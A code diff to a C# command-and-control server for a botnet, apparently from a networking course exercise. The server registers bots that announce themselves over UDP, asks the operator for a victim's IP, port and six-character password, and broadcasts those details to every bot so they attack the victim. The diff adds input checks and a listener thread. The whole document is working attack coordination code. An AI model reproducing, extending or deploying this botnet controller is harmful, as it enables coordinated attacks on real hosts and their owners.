@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Threading;
 
 using System.Net.Sockets;
 using System.Net;
@@ -19,7 +20,7 @@ namespace Command_and_Control
 
         public CnCserver()
         {
-            Name = "ZLATAN'S_ALLMIGHTY_SERVER";
+            Name = "Botonolovella";
             botNet = new HashSet<Tuple<IPAddress, int>>();
 
             StartServer();
@@ -27,22 +28,23 @@ namespace Command_and_Control
 
         private void StartServer()
         {
-            endPoint = new IPEndPoint(IPAddress.Any, botsPort); // ip=255.255.255.255, port=31337
+            endPoint = new IPEndPoint(IPAddress.Any, botsPort);
             udpListener = new UdpClient(endPoint);
-            //udpListener = new UdpClient(botsPort); //this constructor only uses port because he's only listening??
             Console.WriteLine("Command and Control server " + Name + " active");
+            Console.WriteLine();
+            Console.WriteLine("to initiate an attack click: 'a'");
+            Console.WriteLine();
+
+            new Thread(ListenBots).Start();
         }
 
-        // will run by a new thread. this methods listen to bot announcements 
-        // and saves the details in botNet hashSet
-        public void ListenToBotAnnouncements()
+        private void ListenBots()
         {
             try
             {
                 while (true)
                 {
-                    byte[] bot_data = new byte[2];
-                    bot_data = udpListener.Receive(ref endPoint); // blocking call
+                    byte[] bot_data = udpListener.Receive(ref endPoint); // blocking call
                     string botPort = Encoding.UTF8.GetString(bot_data);
                     botNet.Add(new Tuple<IPAddress, int>(endPoint.Address, Convert.ToInt32(botPort)));
                 }
@@ -56,9 +58,48 @@ namespace Command_and_Control
         public void AttackVictim()
         {
             string ip, port, password;
+            Console.WriteLine();
             Console.WriteLine(">> Enter victim details:");
+
             Console.Write(">> ip = "); ip = Console.ReadLine();
+            IPAddress tmp;
+            int iTmp;
+            if (!IPAddress.TryParse(ip, out tmp))
+            {
+                while (true)
+                {
+                    Console.Write(">> illegal ip. re-enter: ");
+                    ip = Console.ReadLine();
+                    if (IPAddress.TryParse(ip, out tmp))
+                        break;
+                }
+            }
+
             Console.Write(">> port = "); port = Console.ReadLine();
+            if(!Int32.TryParse(port, out iTmp))
+            {
+                while (true)
+                {
+                    Console.Write(">> illegal port. re-enter: ");
+                    port = Console.ReadLine();
+                    if (Int32.TryParse(port, out iTmp))
+                        break;
+                }
+            }
+            else if(Int32.TryParse(port, out iTmp))
+            {
+                if(iTmp <1025 || iTmp > 65535)
+                {
+                    while (true)
+                    {
+                        Console.Write(">> illegal port. re-enter: ");
+                        port = Console.ReadLine();
+                        if (Int32.TryParse(port, out iTmp) && (iTmp >=1025 && iTmp<=65535))
+                            break;
+                    }
+                }
+            }
+
             Console.Write(">> password = "); password = Console.ReadLine();
             if (password.Length != 6)
             {
@@ -68,7 +109,7 @@ namespace Command_and_Control
                     Console.Write(">> illegal password. re-enter: ");
                     password = Console.ReadLine();
                     if (password.Length == 6)
-                        passNotValid = false;
+                        break;
                 }
             }
             Console.WriteLine();
@@ -82,13 +123,12 @@ namespace Command_and_Control
         {
             foreach (Tuple<IPAddress, int> bot in botNet)
             {
-                IPEndPoint botAddress = new IPEndPoint(bot.Item1, bot.Item2);
-                UdpClient activateBot = new UdpClient(botAddress);
-                byte[] data = Encoding.UTF8.GetBytes(ip + ";" + port + ";" + password + ";" + Name);
-                activateBot.Send(data, data.Length);
+                UdpClient activateBot = new UdpClient();
+                activateBot.Connect(bot.Item1, bot.Item2);
+                byte[] data = Encoding.UTF8.GetBytes(ip + "," + port + "," + password + "," + Name);
+                activateBot.Send(data, data.Length); //send to ListenAndAttack in Bot
+                activateBot.Close();
             }
-
-            //botNet.Clear(); //needed???
         }
     }
 }
